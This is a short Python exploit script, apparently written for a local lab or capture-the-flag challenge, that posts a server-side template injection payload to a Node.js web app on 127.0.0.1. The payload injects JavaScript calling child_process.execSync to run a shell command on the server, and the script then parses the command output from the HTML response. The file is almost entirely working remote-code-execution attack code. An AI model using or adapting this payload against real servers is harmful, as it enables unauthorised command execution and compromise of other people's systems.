import requests
import re
import HTMLParser
import base64

def sendPayload(payload_arg="me"):
    url = "http://127.0.0.1:5064/"
    result1 = requests.post(url,data={"name":payload_arg}).text
    return result1

#tplmap exploit 
command_to_execute = "ls"
jscode = "global.process.mainModule.require('child_process').execSync('%s').toString()"%command_to_execute

payload ='''{{=%s}}'''%jscode

print(payload)
#range.constructor("return eval()")()

resutl = sendPayload(payload)
try:
    regex = r"<p>Hello (.*)</p>"
    matches = re.findall(regex,resutl)
    print(HTMLParser.HTMLParser().unescape(matches[0]))
except:
    print("RESULT ERROR:\n"+resutl)

#$ var name = input.name;
#<div>
#    Hello, ${name}
#    $ console.log('The value rendered was', name);
#</div>
#$ {
#    var bgColor = getRandomColor();
#    var textColor = isLight(bgColor)
#        ? 'black'
#        : 'white';
#}







